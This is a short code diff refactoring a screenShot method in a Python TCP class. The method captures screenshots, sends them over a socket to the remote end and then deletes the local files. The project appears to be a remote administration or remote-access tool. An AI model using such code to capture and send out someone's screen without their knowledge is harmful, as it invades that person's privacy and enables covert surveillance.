@@ -823,31 +823,20 @@ class TCP:
 
     def screenShot(self, cmd):
         params = self.parametros(cmd, r"(\s-[dnot]+[= ])")[0]
-        if '-d' in params.keys():
-            directorio = params['-d']
-        else:
-            directorio = '.'
+        directorio = params['-d'] if '-d' in params.keys() else '.'
 
-        n = 1
-        t = 0
-        if '-n' in params.keys():
-            n = int(params['-n'])
-        if '-t' in params.keys():
-            t = int(params['-t'])
+        n = int(params['-n']) if '-n' in params.keys() else 1
+        t = float(params['-t']) if '-t' in params.keys() else 0.0
 
         screen = mss.mss()
         i = 0
         while i < n:
-            ubicacion = f"{directorio}/ss{i}.png"
+            ubicacion = f"{directorio}/ss.png"
             screen.shot(output=ubicacion)
             self.__sock.send(b'ok')
             self.enviarArchivo(ubicacion)
 
-            if self.__myOs == "windows":
-                os.system(f"del {ubicacion}")
-            if self.__myOs == "linux":
-                os.system(f"rm {ubicacion}")
-
+            os.remove(ubicacion)
             sleep(t)
             i += 1
 
